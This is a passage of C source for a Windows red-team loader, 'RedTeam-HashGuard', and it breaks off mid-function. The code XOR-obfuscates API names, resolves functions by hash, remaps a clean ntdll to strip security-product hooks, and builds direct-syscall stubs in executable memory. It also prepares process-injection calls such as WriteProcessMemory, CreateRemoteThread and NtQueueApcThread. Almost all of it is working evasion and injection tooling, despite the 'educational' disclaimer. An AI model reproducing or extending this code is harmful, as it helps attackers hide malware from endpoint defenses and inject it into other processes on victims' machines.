............................................................................
. Project: RedTeam-HashGuard                                               .
. Build for educational purpose in authorized lab environments only.        .
. Author: Ebere Michhael (Call Simba)                                      .
. Telegram: @lets_sudosu                                                   .
. Make the world a better place.                                           .
............................................................................

#define UNICODE
#define _UNICODE
#include <stdarg.h>
#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include "whispers.h"
#include "win32api.h"
#include "ntdefs.h"
#include "functions.h"
#include "strings.h"

#define STATUS_NOT_FOUND       ((NTSTATUS)0xC0000225L)
#define STATUS_UNSUCCESSFUL    ((NTSTATUS)0xC0000001L)
#define STATUS_SUCCESS         ((NTSTATUS)0x00000000L)
#define STATUS_INVALID_PARAM   ((NTSTATUS)0xC000000DL)
#define STATUS_ACCESS_DENIED   ((NTSTATUS)0xC0000022L)

#ifndef ACCESS_MASK
typedef ULONG ACCESS_MASK;
#endif

NT_FUNCTIONS g_NtFunctions = { 0 };
SW3_SYSCALL_LIST SW3_SyscallList = { 0 };
Win32ApiTable g_Win32ApiTable = { 0 };
PVOID g_SyscallStub = NULL;

static const BYTE SyscallStubTemplate[] = {
    0xB8, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x05,
    0xC3
};

void EncryptString(char* str, BYTE key) {
    for (int i = 0; str[i]; i++) {
        str[i] ^= key;
    }
}

void DecryptStringWithKey(char* str, BYTE key) {
    for (int i = 0; str[i]; i++) {
        str[i] ^= key;
    }
}

void MyStrCat(char* dest, size_t destSize, const char* prefix, const char* suffix) {
    size_t prefixLen = 0, i;
    for (i = 0; prefix[i] && i < destSize - 1; i++) dest[i] = prefix[i], prefixLen++;
    for (i = 0; suffix[i] && (prefixLen + i) < destSize - 1; i++) dest[prefixLen + i] = suffix[i];
    dest[prefixLen + i] = '\0';
}

void GetCurrentTimeString(char* buffer, size_t bufferSize) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(buffer, bufferSize, "%04d-%02d-%02d %02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

#define LOG_BUFFER_SIZE 512
#define TIME_BUFFER_SIZE 64

#define LOG(message) do { \
    char timeBuf[TIME_BUFFER_SIZE]; \
    GetCurrentTimeString(timeBuf, sizeof(timeBuf)); \
    char logBuf[LOG_BUFFER_SIZE]; \
    snprintf(logBuf, sizeof(logBuf), "[%s] %s", timeBuf, message); \
    OutputDebugStringA(logBuf); \
} while (0)

BOOL InitializeSyscallStub(void) {
    SIZE_T size = sizeof(SyscallStubTemplate);
    g_SyscallStub = g_Win32ApiTable.pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!g_SyscallStub) {
        LOG("InitializeSyscallStub: VirtualAlloc failed\n");
        return FALSE;
    }
    memcpy(g_SyscallStub, SyscallStubTemplate, size);
    LOG("InitializeSyscallStub: Syscall stub allocated\n");
    return TRUE;
}

DWORD SW3_HashSyscall(PCSTR FunctionName) {
    DWORD i = 0, Hash = SW3_SEED;
    while (FunctionName[i]) {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + SW3_ROR8(Hash);
    }
    return Hash;
}

PVOID Win32ApiResolve(PVOID ModuleBase, PCSTR FunctionName) {
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)ModuleBase + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    DWORD VirtualAddress = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!VirtualAddress) return NULL;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)ModuleBase + VirtualAddress);
    if (!ExportDirectory) return NULL;
    PDWORD Names = (PDWORD)((PUCHAR)ModuleBase + ExportDirectory->AddressOfNames);
    PDWORD Functions = (PDWORD)((PUCHAR)ModuleBase + ExportDirectory->AddressOfFunctions);
    PWORD Ordinals = (PWORD)((PUCHAR)ModuleBase + ExportDirectory->AddressOfNameOrdinals);
    DWORD hash = SW3_HashSyscall(FunctionName);
    for (DWORD i = 0; i < ExportDirectory->NumberOfNames; i++) {
        PCHAR ExportName = (PCHAR)((PUCHAR)ModuleBase + Names[i]);
        if (!ExportName || IsBadReadPtr(ExportName, 2)) continue;
        if (SW3_HashSyscall(ExportName) == hash) {
            return (PVOID)((PUCHAR)ModuleBase + Functions[Ordinals[i]]);
        }
    }
    return NULL;
}

void RehookExports(PVOID cleanBase);

static char encryptedKernel32[] = { 'k' ^ 0x5A, 'e' ^ 0x5A, 'r' ^ 0x5A, 'n' ^ 0x5A, 'e' ^ 0x5A, 'l' ^ 0x5A, '3' ^ 0x5A, '2' ^ 0x5A, '.' ^ 0x5A, 'd' ^ 0x5A, 'l' ^ 0x5A, 'l' ^ 0x5A, 0 };
static char encryptedAdvapi32[] = { 'a' ^ 0x5A, 'd' ^ 0x5A, 'v' ^ 0x5A, 'a' ^ 0x5A, 'p' ^ 0x5A, 'i' ^ 0x5A, '3' ^ 0x5A, '2' ^ 0x5A, '.' ^ 0x5A, 'd' ^ 0x5A, 'l' ^ 0x5A, 'l' ^ 0x5A, 0 };
static char encryptedVirtualAlloc[] = { 'V' ^ 0x5A, 'i' ^ 0x5A, 'r' ^ 0x5A, 't' ^ 0x5A, 'u' ^ 0x5A, 'a' ^ 0x5A, 'l' ^ 0x5A, 'A' ^ 0x5A, 'l' ^ 0x5A, 'l' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 0 };
static char encryptedVirtualProtect[] = { 'V' ^ 0x5A, 'i' ^ 0x5A, 'r' ^ 0x5A, 't' ^ 0x5A, 'u' ^ 0x5A, 'a' ^ 0x5A, 'l' ^ 0x5A, 'P' ^ 0x5A, 'r' ^ 0x5A, 'o' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'c' ^ 0x5A, 't' ^ 0x5A, 0 };
static char encryptedVirtualFree[] = { 'V' ^ 0x5A, 'i' ^ 0x5A, 'r' ^ 0x5A, 't' ^ 0x5A, 'u' ^ 0x5A, 'a' ^ 0x5A, 'l' ^ 0x5A, 'F' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'e' ^ 0x5A, 0 };
static char encryptedVirtualQuery[] = { 'V' ^ 0x5A, 'i' ^ 0x5A, 'r' ^ 0x5A, 't' ^ 0x5A, 'u' ^ 0x5A, 'a' ^ 0x5A, 'l' ^ 0x5A, 'Q' ^ 0x5A, 'u' ^ 0x5A, 'e' ^ 0x5A, 'r' ^ 0x5A, 'y' ^ 0x5A, 0 };
static char encryptedVirtualQueryEx[] = { 'V' ^ 0x5A, 'i' ^ 0x5A, 'r' ^ 0x5A, 't' ^ 0x5A, 'u' ^ 0x5A, 'a' ^ 0x5A, 'l' ^ 0x5A, 'Q' ^ 0x5A, 'u' ^ 0x5A, 'e' ^ 0x5A, 'r' ^ 0x5A, 'y' ^ 0x5A, 'E' ^ 0x5A, 'x' ^ 0x5A, 0 };
static char encryptedGetModuleHandleA[] = { 'G' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'M' ^ 0x5A, 'o' ^ 0x5A, 'd' ^ 0x5A, 'u' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'H' ^ 0x5A, 'a' ^ 0x5A, 'n' ^ 0x5A, 'd' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedGetProcAddress[] = { 'G' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'P' ^ 0x5A, 'r' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 'A' ^ 0x5A, 'd' ^ 0x5A, 'd' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 's' ^ 0x5A, 0 };
static char encryptedLoadLibraryA[] = { 'L' ^ 0x5A, 'o' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 'L' ^ 0x5A, 'i' ^ 0x5A, 'b' ^ 0x5A, 'r' ^ 0x5A, 'a' ^ 0x5A, 'r' ^ 0x5A, 'y' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedFreeLibrary[] = { 'F' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'e' ^ 0x5A, 'L' ^ 0x5A, 'i' ^ 0x5A, 'b' ^ 0x5A, 'r' ^ 0x5A, 'a' ^ 0x5A, 'r' ^ 0x5A, 'y' ^ 0x5A, 0 };
static char encryptedGetSystemInfo[] = { 'G' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'S' ^ 0x5A, 'y' ^ 0x5A, 's' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'm' ^ 0x5A, 'I' ^ 0x5A, 'n' ^ 0x5A, 'f' ^ 0x5A, 'o' ^ 0x5A, 0 };
static char encryptedGetFileAttributesExA[] = { 'G' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'F' ^ 0x5A, 'i' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'A' ^ 0x5A, 't' ^ 0x5A, 't' ^ 0x5A, 'r' ^ 0x5A, 'i' ^ 0x5A, 'b' ^ 0x5A, 'u' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 'E' ^ 0x5A, 'x' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedFindResourceA[] = { 'F' ^ 0x5A, 'i' ^ 0x5A, 'n' ^ 0x5A, 'd' ^ 0x5A, 'R' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 'o' ^ 0x5A, 'u' ^ 0x5A, 'r' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedLoadResource[] = { 'L' ^ 0x5A, 'o' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 'R' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 'o' ^ 0x5A, 'u' ^ 0x5A, 'r' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 0 };
static char encryptedLockResource[] = { 'L' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 'k' ^ 0x5A, 'R' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 'o' ^ 0x5A, 'u' ^ 0x5A, 'r' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 0 };
static char encryptedSizeofResource[] = { 'S' ^ 0x5A, 'i' ^ 0x5A, 'z' ^ 0x5A, 'e' ^ 0x5A, 'o' ^ 0x5A, 'f' ^ 0x5A, 'R' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 'o' ^ 0x5A, 'u' ^ 0x5A, 'r' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 0 };
static char encryptedVirtualAllocEx[] = { 'V' ^ 0x5A, 'i' ^ 0x5A, 'r' ^ 0x5A, 't' ^ 0x5A, 'u' ^ 0x5A, 'a' ^ 0x5A, 'l' ^ 0x5A, 'A' ^ 0x5A, 'l' ^ 0x5A, 'l' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 'E' ^ 0x5A, 'x' ^ 0x5A, 0 };
static char encryptedWriteProcessMemory[] = { 'W' ^ 0x5A, 'r' ^ 0x5A, 'i' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'P' ^ 0x5A, 'r' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 's' ^ 0x5A, 'M' ^ 0x5A, 'e' ^ 0x5A, 'm' ^ 0x5A, 'o' ^ 0x5A, 'r' ^ 0x5A, 'y' ^ 0x5A, 0 };
static char encryptedVirtualFreeEx[] = { 'V' ^ 0x5A, 'i' ^ 0x5A, 'r' ^ 0x5A, 't' ^ 0x5A, 'u' ^ 0x5A, 'a' ^ 0x5A, 'l' ^ 0x5A, 'F' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'e' ^ 0x5A, 'E' ^ 0x5A, 'x' ^ 0x5A, 0 };
static char encryptedSleepEx[] = { 'S' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'e' ^ 0x5A, 'p' ^ 0x5A, 'E' ^ 0x5A, 'x' ^ 0x5A, 0 };
static char encryptedCloseHandle[] = { 'C' ^ 0x5A, 'l' ^ 0x5A, 'o' ^ 0x5A, 's' ^ 0x5A, 'e' ^ 0x5A, 'H' ^ 0x5A, 'a' ^ 0x5A, 'n' ^ 0x5A, 'd' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 0 };
static char encryptedCreateProcessA[] = { 'C' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'P' ^ 0x5A, 'r' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 's' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedTerminateProcess[] = { 'T' ^ 0x5A, 'e' ^ 0x5A, 'r' ^ 0x5A, 'm' ^ 0x5A, 'i' ^ 0x5A, 'n' ^ 0x5A, 'a' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'P' ^ 0x5A, 'r' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 's' ^ 0x5A, 0 };
static char encryptedWaitForSingleObject[] = { 'W' ^ 0x5A, 'a' ^ 0x5A, 'i' ^ 0x5A, 't' ^ 0x5A, 'F' ^ 0x5A, 'o' ^ 0x5A, 'r' ^ 0x5A, 'S' ^ 0x5A, 'i' ^ 0x5A, 'n' ^ 0x5A, 'g' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'O' ^ 0x5A, 'b' ^ 0x5A, 'j' ^ 0x5A, 'e' ^ 0x5A, 'c' ^ 0x5A, 't' ^ 0x5A, 0 };
static char encryptedGetModuleFileNameA[] = { 'G' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'M' ^ 0x5A, 'o' ^ 0x5A, 'd' ^ 0x5A, 'u' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'F' ^ 0x5A, 'i' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'N' ^ 0x5A, 'a' ^ 0x5A, 'm' ^ 0x5A, 'e' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedCreateFileA[] = { 'C' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'F' ^ 0x5A, 'i' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedMoveFileExA[] = { 'M' ^ 0x5A, 'o' ^ 0x5A, 'v' ^ 0x5A, 'e' ^ 0x5A, 'F' ^ 0x5A, 'i' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 'E' ^ 0x5A, 'x' ^ 0x5A, 'A' ^ 0x5A, 0 };
static char encryptedCreateThread[] = { 'C' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'T' ^ 0x5A, 'h' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 0 };
static char encryptedCreateRemoteThread[] = { 'C' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'R' ^ 0x5A, 'e' ^ 0x5A, 'm' ^ 0x5A, 'o' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'T' ^ 0x5A, 'h' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 0 };
static char encryptedIsDebuggerPresent[] = { 'I' ^ 0x5A, 's' ^ 0x5A, 'D' ^ 0x5A, 'e' ^ 0x5A, 'b' ^ 0x5A, 'u' ^ 0x5A, 'g' ^ 0x5A, 'g' ^ 0x5A, 'e' ^ 0x5A, 'r' ^ 0x5A, 'P' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 'e' ^ 0x5A, 'n' ^ 0x5A, 't' ^ 0x5A, 0 };
static char encryptedDuplicateHandle[] = { 'D' ^ 0x5A, 'u' ^ 0x5A, 'p' ^ 0x5A, 'l' ^ 0x5A, 'i' ^ 0x5A, 'c' ^ 0x5A, 'a' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'H' ^ 0x5A, 'a' ^ 0x5A, 'n' ^ 0x5A, 'd' ^ 0x5A, 'l' ^ 0x5A, 'e' ^ 0x5A, 0 };
static char encryptedResumeThread[] = { 'R' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 'u' ^ 0x5A, 'm' ^ 0x5A, 'e' ^ 0x5A, 'T' ^ 0x5A, 'h' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 0 };
static char encryptedSuspendThread[] = { 'S' ^ 0x5A, 'u' ^ 0x5A, 's' ^ 0x5A, 'p' ^ 0x5A, 'e' ^ 0x5A, 'n' ^ 0x5A, 'd' ^ 0x5A, 'T' ^ 0x5A, 'h' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 0 };
static char encryptedGetThreadContext[] = { 'G' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'T' ^ 0x5A, 'h' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 'C' ^ 0x5A, 'o' ^ 0x5A, 'n' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'x' ^ 0x5A, 't' ^ 0x5A, 0 };
static char encryptedSetThreadContext[] = { 'S' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'T' ^ 0x5A, 'h' ^ 0x5A, 'r' ^ 0x5A, 'e' ^ 0x5A, 'a' ^ 0x5A, 'd' ^ 0x5A, 'C' ^ 0x5A, 'o' ^ 0x5A, 'n' ^ 0x5A, 't' ^ 0x5A, 'e' ^ 0x5A, 'x' ^ 0x5A, 't' ^ 0x5A, 0 };
static char encryptedOpenProcessToken[] = { 'O' ^ 0x5A, 'p' ^ 0x5A, 'e' ^ 0x5A, 'n' ^ 0x5A, 'P' ^ 0x5A, 'r' ^ 0x5A, 'o' ^ 0x5A, 'c' ^ 0x5A, 'e' ^ 0x5A, 's' ^ 0x5A, 's' ^ 0x5A, 'T' ^ 0x5A, 'o' ^ 0x5A, 'k' ^ 0x5A, 'e' ^ 0x5A, 'n' ^ 0x5A, 0 };
static char encryptedGetTokenInformation[] = { 'G' ^ 0x5A, 'e' ^ 0x5A, 't' ^ 0x5A, 'T' ^ 0x5A, 'o' ^ 0x5A, 'k' ^ 0x5A, 'e' ^ 0x5A, 'n' ^ 0x5A, 'I' ^ 0x5A, 'n' ^ 0x5A, 'f' ^ 0x5A, 'o' ^ 0x5A, 'r' ^ 0x5A, 'm' ^ 0x5A, 'a' ^ 0x5A, 't' ^ 0x5A, 'i' ^ 0x5A, 'o' ^ 0x5A, 'n' ^ 0x5A, 0 };

BOOL InitializeWin32ApiTable() {
    LOG(">>> InitializeWin32ApiTable() entered\n");
    LOG("Attempting to map clean ntdll.dll\n");
    PVOID cleanNtdllBase = MapNtdll();
    if (!cleanNtdllBase) {
        LOG("InitializeWin32ApiTable: Failed to map clean ntdll.dll\n");
        return FALSE;
    }
    LOG("InitializeWin32ApiTable: Clean ntdll.dll mapped successfully\n");
    RehookExports(cleanNtdllBase);
    LOG("InitializeWin32ApiTable: RehookExports completed on clean ntdll.dll\n");
    DecryptString(encryptedKernel32);
    DecryptString(encryptedAdvapi32);
    struct {
        char* dllName;
        char* funcName;
        PVOID* pFunc;
        DWORD funcHash;
    } apiFunctions[] = {
        { encryptedKernel32, encryptedVirtualAlloc, (PVOID*)&g_Win32ApiTable.pVirtualAlloc, 0 },
        { encryptedKernel32, encryptedVirtualProtect, (PVOID*)&g_Win32ApiTable.pVirtualProtect, 0 },
        { encryptedKernel32, encryptedVirtualFree, (PVOID*)&g_Win32ApiTable.pVirtualFree, 0 },
        { encryptedKernel32, encryptedVirtualQuery, (PVOID*)&g_Win32ApiTable.pVirtualQuery, 0 },
        { encryptedKernel32, encryptedVirtualQueryEx, (PVOID*)&g_Win32ApiTable.pVirtualQueryEx, 0 },
        { encryptedKernel32, encryptedGetModuleHandleA, (PVOID*)&g_Win32ApiTable.pGetModuleHandleA, 0 },
        { encryptedKernel32, encryptedGetProcAddress, (PVOID*)&g_Win32ApiTable.pGetProcAddress, 0 },
        { encryptedKernel32, encryptedLoadLibraryA, (PVOID*)&g_Win32ApiTable.pLoadLibraryA, 0 },
        { encryptedKernel32, encryptedFreeLibrary, (PVOID*)&g_Win32ApiTable.pFreeLibrary, 0 },
        { encryptedKernel32, encryptedGetSystemInfo, (PVOID*)&g_Win32ApiTable.pGetSystemInfo, 0 },
        { encryptedKernel32, encryptedGetFileAttributesExA, (PVOID*)&g_Win32ApiTable.pGetFileAttributesExA, 0 },
        { encryptedKernel32, encryptedFindResourceA, (PVOID*)&g_Win32ApiTable.pFindResourceA, 0 },
        { encryptedKernel32, encryptedLoadResource, (PVOID*)&g_Win32ApiTable.pLoadResource, 0 },
        { encryptedKernel32, encryptedLockResource, (PVOID*)&g_Win32ApiTable.pLockResource, 0 },
        { encryptedKernel32, encryptedSizeofResource, (PVOID*)&g_Win32ApiTable.pSizeofResource, 0 },
        { encryptedKernel32, encryptedVirtualAllocEx, (PVOID*)&g_Win32ApiTable.pVirtualAllocEx, 0 },
        { encryptedKernel32, encryptedWriteProcessMemory, (PVOID*)&g_Win32ApiTable.pWriteProcessMemory, 0 },
        { encryptedKernel32, encryptedVirtualFreeEx, (PVOID*)&g_Win32ApiTable.pVirtualFreeEx, 0 },
        { encryptedKernel32, encryptedSleepEx, (PVOID*)&g_Win32ApiTable.pSleepEx, 0 },
        { encryptedKernel32, encryptedCloseHandle, (PVOID*)&g_Win32ApiTable.pCloseHandle, 0 },
        { encryptedKernel32, encryptedCreateProcessA, (PVOID*)&g_Win32ApiTable.pCreateProcessA, 0 },
        { encryptedKernel32, encryptedTerminateProcess, (PVOID*)&g_Win32ApiTable.pTerminateProcess, 0 },
        { encryptedKernel32, encryptedWaitForSingleObject, (PVOID*)&g_Win32ApiTable.pWaitForSingleObject, 0 },
        { encryptedKernel32, encryptedGetModuleFileNameA, (PVOID*)&g_Win32ApiTable.pGetModuleFileNameA, 0 },
        { encryptedKernel32, encryptedCreateFileA, (PVOID*)&g_Win32ApiTable.pCreateFileA, 0 },
        { encryptedKernel32, encryptedMoveFileExA, (PVOID*)&g_Win32ApiTable.pMoveFileExA, 0 },
        { encryptedKernel32, encryptedCreateThread, (PVOID*)&g_Win32ApiTable.pCreateThread, 0 },
        { encryptedKernel32, encryptedCreateRemoteThread, (PVOID*)&g_Win32ApiTable.pCreateRemoteThread, 0 },
        { encryptedKernel32, encryptedIsDebuggerPresent, (PVOID*)&g_Win32ApiTable.pIsDebuggerPresent, 0 },
        { encryptedKernel32, encryptedDuplicateHandle, (PVOID*)&g_Win32ApiTable.pDuplicateHandle, 0 },
        { encryptedKernel32, encryptedResumeThread, (PVOID*)&g_Win32ApiTable.pResumeThread, 0 },
        { encryptedKernel32, encryptedSuspendThread, (PVOID*)&g_Win32ApiTable.pSuspendThread, 0 },
        { encryptedKernel32, encryptedGetThreadContext, (PVOID*)&g_Win32ApiTable.pGetThreadContext, 0 },
        { encryptedKernel32, encryptedSetThreadContext, (PVOID*)&g_Win32ApiTable.pSetThreadContext, 0 },
        { encryptedAdvapi32, encryptedOpenProcessToken, (PVOID*)&g_Win32ApiTable.pOpenProcessToken, 0 },
        { encryptedAdvapi32, encryptedGetTokenInformation, (PVOID*)&g_Win32ApiTable.pGetTokenInformation, 0 },
    };
    size_t numFunctions = sizeof(apiFunctions) / sizeof(apiFunctions[0]);
    int hashType = GetTickCount();
    LOG("Starting string decryption for API functions\n");
    for (size_t i = 0; i < numFunctions; i++) {
        DecryptString(apiFunctions[i].funcName);
        apiFunctions[i].funcHash = HashStringRandom(apiFunctions[i].funcName, hashType);
        char buf[LOG_BUFFER_SIZE];
        snprintf(buf, sizeof(buf), "Decrypted: %s -> %s (hash: 0x%X)\n",
                 apiFunctions[i].funcName, apiFunctions[i].dllName, apiFunctions[i].funcHash);
        LOG(buf);
    }
    LOG("String decryption completed\n");
    for (size_t i = 0; i < numFunctions; i++) {
        char buf[LOG_BUFFER_SIZE];
        snprintf(buf, sizeof(buf), "Attempting to resolve %s from %s\n",
                 apiFunctions[i].funcName, apiFunctions[i].dllName);
        LOG(buf);
        HMODULE hDll = GetModuleHandleA(apiFunctions[i].dllName);
        if (!hDll) {
            hDll = LoadLibraryA(apiFunctions[i].dllName);
            if (!hDll) {
                snprintf(buf, sizeof(buf), "Failed to load %s\n", apiFunctions[i].dllName);
                LOG(buf);
                return FALSE;
            }
        }
        *apiFunctions[i].pFunc = GetProcAddressH(hDll, apiFunctions[i].funcHash, hashType);
        if (!*apiFunctions[i].pFunc) {
            snprintf(buf, sizeof(buf), "Failed to resolve %s from %s (hash: 0x%X)\n",
                     apiFunctions[i].funcName, apiFunctions[i].dllName, apiFunctions[i].funcHash);
            LOG(buf);
            return FALSE;
        } else {
            snprintf(buf, sizeof(buf), "Resolved %s from %s (hash: 0x%X) successfully\n",
                     apiFunctions[i].funcName, apiFunctions[i].dllName, apiFunctions[i].funcHash);
            LOG(buf);
        }
    }
    LOG("Win32 API table initialized successfully with hashed lookups\n");
    return TRUE;
}

BOOL InitializeNtWrappers(void) {
    LOG("InitializeNtWrappers: Starting\n");
    HMODULE ntdll = g_Win32ApiTable.pGetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        LOG("Failed to get handle to ntdll.dll\n");
        return FALSE;
    }
    struct { PCSTR name; PVOID *slot; } list[] = {
        { "NtAllocateVirtualMemory", (PVOID*)&g_NtFunctions.pNtAllocateVirtualMemory },
        { "NtProtectVirtualMemory", (PVOID*)&g_NtFunctions.pNtProtectVirtualMemory },
        { "NtFreeVirtualMemory", (PVOID*)&g_NtFunctions.pNtFreeVirtualMemory },
        { "NtWriteVirtualMemory", (PVOID*)&g_NtFunctions.pNtWriteVirtualMemory },
        { "NtQueueApcThread", (PVOID*)&g_NtFunctions.pNtQueueApcThread },
        { "NtCreateSection", (PVOID*)&g_NtFunctions.pNtCreateSection },
        { "NtMapViewOfSection", (PVOID*)&g_NtFunctions.pNtMapViewOfSection },
        { "NtUnmapViewOfSection", (PVOID*)&g_NtFunctions.pNtUnmapViewOfSection },
        { "NtClose", (PVOID*)&g_NtFunctions.pNtClose },
        { "NtDuplicateObject", (PVOID*)&g_NtFunctions.pNtDuplicateObject },
        { "NtQueryInformationProcess", (PVOID*)&g_NtFunctions.pNtQueryInformationProcess },
        { "NtCreateThreadEx", (PVOID*)&g_NtFunctions.pNtCreateThreadEx },
        { "NtResumeThread", (PVOID*)&g_NtFunctions.pNtResumeThread }
    };
    for (size_t i = 0; i < sizeof(list)/sizeof(list[0]); i++) {
        *list[i].slot = g_Win32ApiTable.pGetProcAddress(ntdll, list[i].name);
        if (!*list[i].slot) {
            char buf[LOG_BUFFER_SIZE];
            snprintf(buf, sizeof(buf), "Failed to resolve %s\n", (char*)list[i].name);
            LOG(buf);
            return FALSE;
        }
    }
    LOG("InitializeNtWrappers: Completed successfully\n");
    return TRUE;
}

#ifdef _M_IX86
BOOL local_is_wow64(void) {
    BOOL bIsWow64 = FALSE;
    return IsWow64Process(GetCurrentProcess(), &bIsWow64) ? bIsWow64 : FALSE;
}
#endif

BOOL SW3_PopulateSyscallList(PVOID CleanNtdllBase) {
    if (SW3_SyscallList.Count) return TRUE;
    if (!CleanNtdllBase) {
        LOG("SW3_PopulateSyscallList: NULL CleanNtdllBase\n");
        return FALSE;
    }
    LOG("SW3_PopulateSyscallList: Starting to populate syscall list\n");
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)CleanNtdllBase;
    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        LOG("SW3_PopulateSyscallList: Invalid DOS header\n");
        return FALSE;
    }
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)CleanNtdllBase + DosHeader->e_lfanew);
    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        LOG("SW3_PopulateSyscallList: Invalid NT header\n");
        return FALSE;
    }
    DWORD VirtualAddress = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!VirtualAddress) {
        LOG("SW3_PopulateSyscallList: No export directory\n");
        return FALSE;
    }
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)CleanNtdllBase + VirtualAddress);
